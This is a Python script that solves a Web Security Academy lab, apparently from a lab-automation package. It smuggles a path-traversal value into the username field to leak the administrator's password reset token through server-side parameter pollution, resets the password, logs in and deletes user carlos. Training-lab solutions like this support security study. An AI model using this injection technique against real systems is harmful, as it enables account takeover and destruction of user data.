from web_security_academy.core.logger import logger


def solve_lab(session):
    # Generate password reset token
    csrf = session.get_csrf_token("/forgot-password")
    data = {"csrf": csrf, "username": "administrator"}
    resp = session.post_path("/forgot-password", data=data)
    logger.info("Generated a password reset token for administrator")

    # Server-side parameter pollution
    logger.info("Sending a POST request to /forgot-password with the following data:")
    data = {
        "csrf": csrf,
        # Path found by visiting ../../../../openapi.json
        "username": "../../../../api/internal/v1/users/administrator/field/passwordResetToken#",
    }
    logger.info(data)

    resp = session.post_path("/forgot-password", data=data)
    if resp.status_code == 400:
        logger.failure("Unable to get password reset token.")
    reset_token = resp.json()["result"]
    logger.success(f"passwordResetToken: {reset_token}")

    # Reset administrator password
    path = f"/forgot-password?passwordResetToken={reset_token}"
    csrf = session.get_csrf_token(path)
    data = {
        "csrf": csrf,
        "passwordResetToken": reset_token,
        "new-password-1": "123456",
        "new-password-2": "123456",
    }
    session.post_path(path, data=data)
    logger.info("Reset administrator's password")

    # Delete user carlos
    session.login("administrator", "123456")
    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
